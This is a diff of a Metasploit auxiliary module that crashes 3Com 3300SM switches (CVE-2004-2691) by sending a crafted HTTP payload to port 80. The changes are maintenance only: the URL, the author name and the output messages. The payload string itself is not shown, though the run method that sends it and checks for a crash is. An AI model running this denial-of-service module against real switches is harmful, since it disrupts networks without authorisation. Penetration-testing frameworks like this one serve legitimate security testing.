@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
@@ -23,18 +18,18 @@ class MetasploitModule < Msf::Auxiliary
         against a 3300SM firmware v2.66. Reported to affect versions
         prior to v2.72.
       },
-      'Author'         => [ 'patrick' ],
+      'Author'         => [ 'aushack' ],
       'License'        => MSF_LICENSE,
       'References'     =>
         [
-          # patrickw - I am not sure if these are correct, but the closest match!
+          # aushack - I am not sure if these are correct, but the closest match!
           [ 'OSVDB', '7246' ],
           [ 'CVE', '2004-2691' ],
           [ 'URL', 'http://support.3com.com/infodeli/tools/switches/dna1695-0aaa17.pdf' ],
         ],
       'DisclosureDate' => 'Jun 24 2004'))
 
-    register_options( [ Opt::RPORT(80) ], self.class )
+    register_options( [ Opt::RPORT(80) ])
   end
 
   def run
@@ -47,13 +42,12 @@ class MetasploitModule < Msf::Auxiliary
 
       sock.put(sploit +"\r\n\r\n")
       disconnect
-      print_status("DoS packet unsuccessful.")
+      print_error("DoS packet unsuccessful")
     rescue ::Rex::ConnectionRefused
-      print_status("Unable to connect to #{rhost}:#{rport}.")
+      print_error("Unable to connect to #{rhost}:#{rport}")
     rescue ::Errno::ECONNRESET
-      print_status("DoS packet successful. #{rhost} not responding.")
+      print_good("DoS packet successful. #{rhost} not responding.")
     end
 
   end
-
 end
